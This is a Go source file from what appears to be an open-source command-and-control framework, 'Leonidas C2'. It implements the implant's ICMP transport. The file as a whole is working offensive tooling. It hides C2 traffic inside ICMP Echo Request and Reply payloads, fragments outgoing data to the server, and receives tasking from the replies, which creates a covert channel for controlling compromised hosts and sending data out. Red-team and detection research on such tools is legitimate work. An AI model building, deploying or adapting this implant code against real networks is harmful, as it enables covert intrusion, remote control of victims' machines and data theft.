package icmpclient

/*
	Leonidas C2 Framework
	Copyright (C) 2026  Leonidas C2 Project

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.IncludeICMP}}

// ICMP C2 client transport.
//
// The implant side:
//   - Sends envelopes to the C2 server embedded in ICMP Echo Request packets.
//   - Receives task envelopes from ICMP Echo Reply packets sent back by the server.
//   - Uses a fixed ICMP Identifier derived from a random 16-bit session token
//     generated at startup, which lets the server demultiplex concurrent sessions.
//   - Large payloads are fragmented across multiple packets; the first fragment
//     carries a 4-byte big-endian total-length header.

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	pb "github.com/leonidas-c2/leonidas/protobuf/leonidaspb"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"google.golang.org/protobuf/proto"
)

const (
	icmpProto        = 1
	icmpMaxData      = 508 // conservative MTU-safe data per Echo packet
	icmpReadTimeout  = 10 * time.Second
)

// ICMPSendEnvelope - Send an envelope to the C2 server via ICMP Echo Requests.
// serverAddr is the IPv4 address of the server (no port).
// sessionID is the 16-bit implant session token embedded in the ICMP ID field.
func ICMPSendEnvelope(conn *icmp.PacketConn, serverAddr net.Addr, sessionID int, envelope *pb.Envelope) error {
	raw, err := proto.Marshal(envelope)
	if err != nil {
		return fmt.Errorf("[icmp] marshal: %w", err)
	}

	totalLen := uint32(len(raw))
	header := make([]byte, 4)
	binary.BigEndian.PutUint32(header, totalLen)

	offset := 0
	seq := 0
	first := true
	for offset < len(raw) {
		var chunk []byte
		if first {
			end := offset + icmpMaxData - 4
			if end > len(raw) {
				end = len(raw)
			}
			chunk = append(header, raw[offset:end]...)
			offset = end
			first = false
		} else {
			end := offset + icmpMaxData
			if end > len(raw) {
				end = len(raw)
			}
			chunk = raw[offset:end]
			offset = end
		}

		msg := &icmp.Message{
			Type: ipv4.ICMPTypeEcho,
			Code: 0,
			Body: &icmp.Echo{
				ID:   sessionID,
				Seq:  seq,
				Data: chunk,
			},
		}
		b, err := msg.Marshal(nil)
		if err != nil {
			return fmt.Errorf("[icmp] marshal packet: %w", err)
		}
		if _, err := conn.WriteTo(b, serverAddr); err != nil {
			return fmt.Errorf("[icmp] write: %w", err)
		}
		seq++
	}
	return nil
}

// ICMPRecvEnvelope - Block until a complete envelope is received from the server.
// Only packets matching sessionID are accepted.
func ICMPRecvEnvelope(conn *icmp.PacketConn, sessionID int) (*pb.Envelope, error) {
	buf := make([]byte, 1500)
	var recvBuf []byte
	var totalLen uint32

	conn.SetReadDeadline(time.Now().Add(icmpReadTimeout))
	for {
		n, _, err := conn.ReadFrom(buf)
		if err != nil {
			return nil, fmt.Errorf("[icmp] read: %w", err)
		}
		msg, err := icmp.ParseMessage(icmpProto, buf[:n])
		if err != nil {
			continue
		}
		if msg.Type != ipv4.ICMPTypeEchoReply {
			continue
		}
		echo, ok := msg.Body.(*icmp.Echo)
		if !ok || echo.ID != sessionID || len(echo.Data) < 4 {
			continue
		}

		if totalLen == 0 {
			totalLen = binary.BigEndian.Uint32(echo.Data[:4])
			recvBuf = make([]byte, 0, totalLen)
			recvBuf = append(recvBuf, echo.Data[4:]...)
		} else {
			recvBuf = append(recvBuf, echo.Data...)
		}

		if uint32(len(recvBuf)) >= totalLen {
			envelope := &pb.Envelope{}
			if err := proto.Unmarshal(recvBuf[:totalLen], envelope); err != nil {
				return nil, fmt.Errorf("[icmp] unmarshal: %w", err)
			}
			return envelope, nil
		}
		conn.SetReadDeadline(time.Now().Add(icmpReadTimeout))
	}
}

// ICMPConnect - Opens a raw ICMP socket to the server and returns
// send/recv channels that integrate with the transports.Connection loop.
func ICMPConnect(serverHost string) (func() error, func() error, chan *pb.Envelope, chan *pb.Envelope, error) {
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		return nil, nil, nil, nil, fmt.Errorf("[icmp] listen: %w", err)
	}

	serverAddr := &net.IPAddr{IP: net.ParseIP(serverHost)}
	sessionID := rand.Intn(0xFFFF) + 1 // random 16-bit session identifier

	// {{if .Config.Debug}}
	log.Printf("[icmp] connected to %s (session=%d)", serverHost, sessionID)
	// {{end}}

	send := make(chan *pb.Envelope, 32)
	recv := make(chan *pb.Envelope, 32)

	var once sync.Once

	stop := func() error {
		once.Do(func() {
			conn.Close()
			close(send)
		})
		return nil
	}

	// Send goroutine
	go func() {
		for envelope := range send {
			if err := ICMPSendEnvelope(conn, serverAddr, sessionID, envelope); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[icmp] send error: %v", err)
				// {{end}}
				return
			}

			// After sending, wait for a reply.
			response, err := ICMPRecvEnvelope(conn, sessionID)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[icmp] recv error: %v", err)
				// {{end}}
				return
			}
			recv <- response
		}
	}()

	start := func() error { return nil }

	return start, stop, send, recv, nil
}

// {{end}}
